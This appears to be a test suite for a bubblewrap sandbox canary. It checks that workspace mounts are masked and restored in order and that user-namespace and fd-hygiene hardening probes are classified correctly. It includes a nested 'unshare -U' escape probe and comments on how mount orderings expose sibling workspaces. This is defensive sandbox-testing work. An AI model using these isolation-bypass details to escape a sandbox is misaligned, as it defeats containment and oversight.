 * The ordering invariant, as a violations list (empty = holds):
 *  1. DENY EXISTS — at least one `--tmpfs` whose target strictly contains
 *     `wsDst` (the parent-root mask; an exact-ws tmpfs masks the workspace
 *     but hides zero siblings).
 *  2. RESTORE IS FINAL (RW) — the committed fixture is the NON-readOnly
 *     shape, so the LAST mount op covering `wsDst` must be the rw
 *     `--bind wsDst wsDst`. A covering tmpfs/bind landing after it either
 *     strands the workspace (mask / ro re-bind — the #5848 shape) or
 *     re-exposes every sibling (ancestor re-bind). A hypothetical readOnly
 *     fixture would pin `--ro-bind wsDst wsDst` final instead — same
 *     invariant, different token.
 *  3. DENY PRECEDES RESTORE — at least one strict-covering `--tmpfs` sits
 *     before that final rw ws bind.
 */
function denyBeforeRestoreViolations(argv: string[], wsDst: string): string[] {
  const coveringTmpfs: number[] = [];
  const coveringOps: { i: number; tok: string }[] = [];
  const wsRwBindIdx: number[] = [];
  for (let i = 0; i < argv.length; i++) {
    const tok = argv[i];
    if (tok === "--tmpfs" && pathStrictlyCovers(argv[i + 1], wsDst)) {
      coveringTmpfs.push(i);
    }
    if (MOUNT_DST_OPTS.has(tok) && pathCovers(argv[i + 1], wsDst)) {
      coveringOps.push({ i, tok });
    } else if (MOUNT_DST2_OPTS.has(tok) && pathCovers(argv[i + 2], wsDst)) {
      coveringOps.push({ i, tok });
    }
    if (tok === "--bind" && argv[i + 1] === wsDst && argv[i + 2] === wsDst) {
      wsRwBindIdx.push(i);
    }
  }
  const violations: string[] = [];
  if (coveringTmpfs.length === 0) {
    violations.push("no strict-ancestor --tmpfs covers the workspace — tenant deny absent");
  }
  const lastWsBind = wsRwBindIdx[wsRwBindIdx.length - 1];
  if (lastWsBind === undefined) {
    violations.push(`no rw --bind restore of ${wsDst}`);
  } else {
    for (const { i, tok } of coveringOps) {
      if (i > lastWsBind) {
        violations.push(
          `covering ${tok} ${argv[i + 1]} (argv[${i}]) lands after the final ws bind at argv[${lastWsBind}] — masks or re-exposes the tree`,
        );
      }
    }
  }
  if (lastWsBind !== undefined && !coveringTmpfs.some((i) => i < lastWsBind)) {
    violations.push("no covering --tmpfs precedes the final ws bind — deny never lands");
  }
  return violations;
}

describe("committed-fixture deny-before-restore ordering pin (#5862)", () => {
  const fx = JSON.parse(
    readFileSync(fileURLToPath(new URL("../infra/sandbox-canary-argv.json", import.meta.url)), "utf8"),
  ) as { bwrapSetupArgv: string[]; prepDirs: string[] };

  it("every covering --tmpfs precedes an rw --bind restore of the workspace", () => {
    const argv = substituteFixtureArgv(fx.bwrapSetupArgv);
    expect(denyBeforeRestoreViolations(argv, WS_REAL)).toEqual([]);
  });

  it("the covering deny root is prepped (literal capture root lands in prepDirs)", () => {
    expect(fx.prepDirs).toContain(CANARY_ROOT_REAL);
  });

  // Guard Contract mutation matrix — the pin must drive RED on each broken
  // ordering and PASS the one legal variant. Rows run against a canonical
  // synthetic argv (covering tmpfs + post-deny restore), so the matrix is
  // meaningful even before the fixture is re-captured.
  const CANON: string[] = [
    "--ro-bind", "/", "/",
    "--bind", WS_REAL, WS_REAL,
    "--tmpfs", CANARY_ROOT_REAL,
    "--tmpfs", "/proc",
    "--bind", WS_REAL, WS_REAL, // the vendor deny-wipe restore
    "--dev", "/dev",
  ];
  const withoutPair = (a: string[], opt: string, arg: string): string[] => {
    // Remove the first (opt, arg) pair matching BOTH tokens.
    const out = [...a];
    for (let j = 0; j < out.length - 1; j++) {
      if (out[j] === opt && out[j + 1] === arg) {
        out.splice(j, 2);
        return out;
      }
    }
    throw new Error(`mutator setup: (${opt}, ${arg}) not found`);
  };

  const ROWS: {
    name: string;
    mutate: (a: string[]) => string[];
    /** Expected violation class regex when the row must go RED. */
    expectViolation?: RegExp;
  }[] = [
    {
      // deny lands after the write restore → shadows it.
      name: "covering --tmpfs moved after the last ws bind",
      mutate: (a) => [...withoutPair(a, "--tmpfs", CANARY_ROOT_REAL), "--tmpfs", CANARY_ROOT_REAL],
      expectViolation: /lands after the final ws bind/,
    },
    {
      // deny present, post-deny restore missing.
      name: "post-deny ws restore binds deleted",
      mutate: (a) => {
        const cut = a.indexOf("--tmpfs");
        const out: string[] = [];
        for (let i = 0; i < a.length; i++) {
          if (i > cut && a[i] === "--bind" && a[i + 1] === WS_REAL && a[i + 2] === WS_REAL) {
            i += 2;
            continue;
          }
          out.push(a[i]);
        }
        return out;
      },
      expectViolation: /lands after the final ws bind/,
    },
    {
      // no covering deny at all — must fail, not vacuously pass.
      name: "no covering --tmpfs (vacuity guard)",
      mutate: (a) => withoutPair(a, "--tmpfs", CANARY_ROOT_REAL),
      expectViolation: /no strict-ancestor --tmpfs/,
    },
    {
      // a SECOND covering deny after the last restore — every covering
      // deny is quantified, not just the first.
      name: "second covering --tmpfs appended after the last ws bind",
      mutate: (a) => [...a, "--tmpfs", "/tmp"],
      expectViolation: /lands after the final ws bind/,
    },
    {
      // ro-bind re-mount of ws AFTER the rw restore — last-writer-wins makes
      // the workspace read-only (the #5848 regression shape via a different
      // mechanism). The final covering op must be the rw bind.
      name: "post-restore --ro-bind ws ws shadows the rw restore",
      mutate: (a) => [...a, "--ro-bind", WS_REAL, WS_REAL],
      expectViolation: /lands after the final ws bind/,
    },
    {
      // sibling-prefix path that is NOT an ancestor — "/tmp/x-evil" must not
      // satisfy coverage of "/tmp/x/<ws>".
      name: "prefix-sibling --tmpfs (/tmp/soleur-sandbox-canary-evil) does not count as covering",
      mutate: (a) => [...withoutPair(a, "--tmpfs", CANARY_ROOT_REAL), "--tmpfs", `${CANARY_ROOT_REAL}-evil`],
      expectViolation: /no strict-ancestor --tmpfs/,
    },
    {
      // covering BIND (not tmpfs) after the last ws bind — re-exposes the
      // whole parent ro/rw. The pin must see non-tmpfs covering ops.
      name: "post-restore --bind of the parent root re-exposes siblings",
      mutate: (a) => [...a, "--bind", CANARY_ROOT_REAL, CANARY_ROOT_REAL],
      expectViolation: /lands after the final ws bind/,
    },
    {
      // remount-ro flips the restored workspace read-only post-restore.
      name: "--remount-ro on the workspace root after the restore",
      mutate: (a) => [...a, "--remount-ro", CANARY_ROOT_REAL],
      expectViolation: /lands after the final ws bind/,
    },
    {
      // an unrelated non-covering deny after the restore is legal —
      // proves the pin does not reject every post-restore tmpfs.
      name: "non-covering --tmpfs after the last ws bind",
      mutate: (a) => [...a, "--tmpfs", "/var/spool/other-deny"],
      expectViolation: undefined,
    },
    {
      // exact-ws tmpfs + restore: masks the workspace but no siblings —
      // the deny-presence clause requires a STRICT ancestor.
      name: "--tmpfs at wsDst itself (covers own only, hides no siblings)",
      mutate: (a) => [...withoutPair(a, "--tmpfs", CANARY_ROOT_REAL), "--tmpfs", WS_REAL],
      expectViolation: /no strict-ancestor --tmpfs/,
    },
  ];

  for (const row of ROWS) {
    it(`mutation: ${row.name} → ${row.expectViolation ? "RED" : "PASS"}`, () => {
      const mutated = row.mutate([...CANON]);
      const violations = denyBeforeRestoreViolations(mutated, WS_REAL);
      if (row.expectViolation) {
        expect(
          violations.some((v) => row.expectViolation!.test(v)),
          `expected a ${row.expectViolation} violation on: ${JSON.stringify(mutated)}; got ${JSON.stringify(violations)}`,
        ).toBe(true);
      } else {
        expect(violations).toEqual([]);
      }
    });
  }
});

// ---------------------------------------------------------------------------
// #8752 — derived hardening probes: verdict contract. Probe failures are
// `sandbox_broken` (they signal a deployed-hardening regression → the soak
// resets and the Sentry page fires); infra-shape failures stay
// `canary_infra_error` (hold the soak — never a false rollback).
// ---------------------------------------------------------------------------
describe("classifyUsernsDenyProbe — nested-userns deny must EPERM", () => {
  it("unshare -U exits 0 inside ⇒ sandbox_broken userns_filter_bypass (filter never installed)", () => {
    expect(classifyUsernsDenyProbe({ status: 0 })).toMatchObject({
      verdict: "sandbox_broken",
      reason: "userns_filter_bypass",
      probe: "nested_userns_deny",
    });
  });

  it("EPERM signature ⇒ null (the filter denied it)", () => {
    expect(
      classifyUsernsDenyProbe({ status: 1, stderr: "unshare: unshare failed: Operation not permitted" }),
    ).toBeNull();
  });

  it("non-zero WITHOUT the EPERM signature ⇒ canary_infra_error (expected-fail inversion guard)", () => {
    // A bwrap setup failure or a missing unshare binary cannot prove the
    // filter denied anything — infra, not a hardening pass.
    expect(classifyUsernsDenyProbe({ status: 1, stderr: "bwrap: execvp /usr/bin/unshare: No such file" })).toMatchObject({
      verdict: "canary_infra_error",
      reason: "userns_probe_exit_1",
    });
  });

  it("spawn error ⇒ canary_infra_error", () => {
    expect(classifyUsernsDenyProbe({ status: null, errorCode: "ENOENT" })).toMatchObject({
      verdict: "canary_infra_error",
      reason: "userns_probe_spawn_enoent",
    });
  });
});

describe("classifyForkProbe — the over-broad control (fork survives)", () => {
  it("forked child exits 0 ⇒ null", () => {
    expect(classifyForkProbe({ status: 0 })).toBeNull();
  });

  it("forked child fails ⇒ sandbox_broken userns_filter_overbroad", () => {
    // `unshare -m` cannot be this control: the payload runs capability-free
    // (bwrap zeroes the capset before exec), so nested CLONE_NEWNS needs a
    // CAP_SYS_ADMIN it doesn't hold — EPERM on every kernel.
    expect(classifyForkProbe({ status: 1 })).toMatchObject({
      verdict: "sandbox_broken",
      reason: "userns_filter_overbroad",
      probe: "fork_survives",
    });
  });

  it("signal-kill / setup-side failure ⇒ canary_infra_error, never a false over-broad page", () => {
    // status null = killed (the 15s spawn timeout or a container OOM of the
    // payload sh) — infra, not a filter regression.
    expect(classifyForkProbe({ status: null })).toMatchObject({
      verdict: "canary_infra_error",
      reason: "fork_probe_exit_null",
    });
    // A `bwrap:` setup line means the sandbox never built — infra.
    expect(classifyForkProbe({ status: 1, stderr: "bwrap: Can't create file at /tmp/x" })).toMatchObject({
      verdict: "canary_infra_error",
      reason: "fork_probe_exit_1",
    });
  });

  it("spawn error ⇒ canary_infra_error", () => {
    expect(classifyForkProbe({ status: null, errorCode: "EACCES" })).toMatchObject({
      verdict: "canary_infra_error",
      reason: "fork_probe_spawn_eacces",
    });
  });
});

describe("classifyFdCensusProbe — in-sandbox fd count stays within the limit", () => {
  it("count ≤ limit ⇒ null", () => {
    expect(classifyFdCensusProbe({ status: 0, stdout: "4\n" }, 4)).toBeNull();
    expect(classifyFdCensusProbe({ status: 0, stdout: "3" }, 4)).toBeNull();
  });

  it("count > limit ⇒ sandbox_broken fd_hygiene_bypass", () => {
    expect(classifyFdCensusProbe({ status: 0, stdout: "9\n" }, 4)).toMatchObject({
      verdict: "sandbox_broken",
      reason: "fd_hygiene_bypass",
      probe: "fd_census",
    });
  });

  it("unparseable/non-zero census ⇒ canary_infra_error, never a false bypass", () => {
    expect(classifyFdCensusProbe({ status: 0, stdout: "not-a-number" }, 4)).toMatchObject({
      verdict: "canary_infra_error",
      reason: "fd_census_unparseable",
    });
    expect(classifyFdCensusProbe({ status: 2, stdout: "" }, 4)).toMatchObject({
      verdict: "canary_infra_error",
      reason: "fd_census_exit_2",
    });
  });

  it("a count below 3 is vacuous, not clean — stdio 0-2 always exist", () => {
    // A masked/absent /proc makes the census read ~nothing: an empty string
    // parses to 0 and a bare glob echo to 1 — both must be infra errors, not
    // passes (a green that measured nothing is indistinguishable from health).
    for (const stdout of ["", "0", "1", "2"]) {
      expect(classifyFdCensusProbe({ status: 0, stdout }, 4)).toMatchObject({
        verdict: "canary_infra_error",
        reason: "fd_census_unparseable",
      });
    }
  });
});

describe("countFdValuedOptions — census slack for argv-referenced fds", () => {
  it("the committed fixture argv carries no fd-valued options → limit stays 4", () => {
    const fx = JSON.parse(
      readFileSync(fileURLToPath(new URL("../infra/sandbox-canary-argv.json", import.meta.url)), "utf8"),
    ) as { bwrapSetupArgv: string[] };
    expect(countFdValuedOptions(fx.bwrapSetupArgv)).toBe(0);
  });

  it("counts every fd-valued option in the shim's preserve vocabulary (bwrap(1) — all 16)", () => {
    expect(
      countFdValuedOptions([
        "--args", "3", "--seccomp", "4", "--add-seccomp-fd", "5",
        "--sync-fd", "6", "--info-fd", "7", "--json-status-fd", "8",
        "--block-fd", "9", "--userns-block-fd", "10",
        "--userns", "11", "--userns2", "12", "--pidns", "13",
        "--file", "14", "--bind-data", "15", "--ro-bind-data", "16",
        "--bind-fd", "17", "--ro-bind-fd", "18",
      ]),
    ).toBe(16);
    expect(countFdValuedOptions(["--unshare-user", "--ro-bind", "/", "/"])).toBe(0);
  });
});

// --- Outer-wrap arm (#5863 T3.1) --------------------------------------------
// The --replay-outer path: fixture validation, {{ROOT}} substitution, and the
// three-way verdict (mountns EPERM vs realized-isolation violation vs infra).

describe("validateOuterWrapFixture — outer-bwrap-v1 contract", () => {
  const valid = {
    schema: "outer-bwrap-v1",
    status: "generated",
    prepDirs: ["{{ROOT}}/workspaces/ws-aaaa"],
    prepFiles: ["{{ROOT}}/home/soleur/.claude/.credentials.json"],
    bwrapSetupArgv: ["--die-with-parent", "--ro-bind", "/usr", "/usr", "--chdir", "{{ROOT}}/workspaces/ws-aaaa", "--"],
  };

  it("accepts the committed fixture shape", () => {
    expect(validateOuterWrapFixture(valid)).toBe(valid);
  });

  it("rejects a non-outer schema (the inner canonical fixture is a different arm)", () => {
    expect(() => validateOuterWrapFixture({ ...valid, schema: "canonical-bwrap-v1" })).toThrow(/schema/);
  });

  it("rejects a missing '--' terminator (the payload follows it)", () => {
    expect(() =>
      validateOuterWrapFixture({ ...valid, bwrapSetupArgv: ["--die-with-parent"] }),
    ).toThrow(/--/);
  });

  it("rejects non-array prep manifests", () => {
    expect(() =>
      validateOuterWrapFixture({ ...valid, prepFiles: "{{ROOT}}/x" }),
    ).toThrow(/prepFiles/);
  });
});

describe("substituteOuterRoot + outerWrapChdirTarget", () => {
  it("substitutes every {{ROOT}} occurrence", () => {
    expect(
      substituteOuterRoot(["--bind", "{{ROOT}}/w/x", "{{ROOT}}/w/x", "--"], "/r"),
    ).toEqual(["--bind", "/r/w/x", "/r/w/x", "--"]);
  });

  it("finds the --chdir target; undefined when absent", () => {
    expect(outerWrapChdirTarget(["--chdir", "/r/w", "--"])).toBe("/r/w");
    expect(outerWrapChdirTarget(["--bind", "/a", "/a", "--"])).toBeUndefined();
  });
});

describe("classifyOuterWrapReplayVerdict — three-way discrimination", () => {
  it("exit 0 + isolation_ok ⇒ pass", () => {
    expect(
      classifyOuterWrapReplayVerdict({ bwrapExitCode: 0, bwrapStdout: "isolation_ok\n" }),
    ).toEqual({ verdict: "pass", reason: "ok" });
  });

  it("payload FAIL markers ⇒ sandbox_broken isolation_probe_failed (a realized violation, never infra)", () => {
    expect(
      classifyOuterWrapReplayVerdict({
        bwrapExitCode: 1,
        bwrapStdout: "FAIL: sibling /r/workspaces/ws-bbbb exists inside the wrap\nisolation_fail\n",
      }),
    ).toEqual({ verdict: "sandbox_broken", reason: "isolation_probe_failed" });
  });

  it('bwrap stderr "Operation not permitted" ⇒ sandbox_broken (file-cap posture regressed)', () => {
    expect(
      classifyOuterWrapReplayVerdict({
        bwrapExitCode: 1,
        bwrapStderr: "bwrap: Can't mount /usr: Operation not permitted",
      }),
    ).toEqual({ verdict: "sandbox_broken", reason: "bwrap_operation_not_permitted" });
  });

  it("spawn ENOENT ⇒ canary_infra_error (do NOT roll back)", () => {
    expect(
      classifyOuterWrapReplayVerdict({ spawnErrorCode: "ENOENT" }),
    ).toEqual({ verdict: "canary_infra_error", reason: "bwrap_spawn_enoent" });
  });

  it("exit 0 without the probe verdict ⇒ canary_infra_error probe_output_missing (a vacuous green is not a pass)", () => {
    expect(
      classifyOuterWrapReplayVerdict({ bwrapExitCode: 0, bwrapStdout: "" }),
    ).toEqual({ verdict: "canary_infra_error", reason: "probe_output_missing" });
  });

  it("unattributed non-zero ⇒ canary_infra_error, not sandbox_broken", () => {
    expect(
      classifyOuterWrapReplayVerdict({ bwrapExitCode: 2, bwrapStderr: "something odd" }),
    ).toEqual({ verdict: "canary_infra_error", reason: "bwrap_exit_2" });
  });
});
